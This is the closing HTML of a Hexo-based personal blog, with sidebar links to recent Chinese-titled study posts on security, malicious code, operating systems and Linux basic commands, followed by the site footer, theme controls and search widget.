no-cover"><div class="content"><a class="title" href="/2025/10/25/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E4%BF%A1%E5%AE%89%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80/%E5%AE%89%E5%85%A8/" title="安全">安全</a><time datetime="2025-10-25T13:40:14.000Z" title="Created 2025-10-25 21:40:14">2025-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/25/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E4%BF%A1%E5%AE%89%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" title="恶意代码">恶意代码</a><time datetime="2025-10-25T13:40:14.000Z" title="Created 2025-10-25 21:40:14">2025-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/25/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" title="操作系统">操作系统</a><time datetime="2025-10-25T13:40:14.000Z" title="Created 2025-10-25 21:40:14">2025-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/linux/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" title="linux基础命令">linux基础命令</a><time datetime="2025-10-25T13:40:14.000Z" title="Created 2025-10-25 21:40:14">2025-10-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By wan yan</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/code-toggle.js"></script><script defer id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span> Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>